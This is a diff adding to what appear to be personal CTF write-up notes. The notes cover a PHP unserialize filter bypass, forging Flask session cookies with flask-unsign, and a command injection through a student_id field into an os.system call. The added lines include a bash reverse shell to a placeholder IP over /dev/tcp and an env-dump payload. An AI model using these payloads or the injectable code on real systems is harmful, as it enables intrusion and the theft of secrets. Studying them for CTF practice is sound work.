@@ -162,3 +162,28 @@ if(!preg_match('/^[Oa]:[\d]+|Array|Iterator|Object|List/i',$_GET['Pochy'])){
 >很经典不能O,a开头，那我们就C开头，不能有ArrayObject，啧，之前ctfshow学到的没用了，最终发现SplStack这个类也能用，然后就是绕__destruct，也就是只能使用[A-Za-z_\(\)]，最后带个; 怎么把givemegirlfriend! 除掉是个问题，__halt_compiler(); 可以中断编译器的执行，不让eval解析后面的就行了，这里没法用引号，所以得构造无参rce，exp如下：
 
 https://www.cnblogs.com/F12-blog/p/17472787.html
+
+
+## flask
+```shell
+flask-unsign --unsign --cookie eyJyb2xlIjoiYW5vbnltb3VzIn0.ZnPqiw.nFlXAccc0v_3qOQU5YqV2yam_tA
+
+flask-unsign --sign --cookie "{'role':'admin'}" --secret 'admin123'
+```
+
+## flask 反弹shell
+
+student_id注入
+
+```python 
+    old_path = saveTmp(delete=False).name
+    file.save(old_path)
+    new_path = f"uploads/{name}-{student_id}.zip"
+    os.system(f"mv {old_path} {new_path}")
+```
+
+```shell
+#student_id 
+123.zip ; bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/xxxx <&1' #
+123.zip ; env > robots.txt #
+```
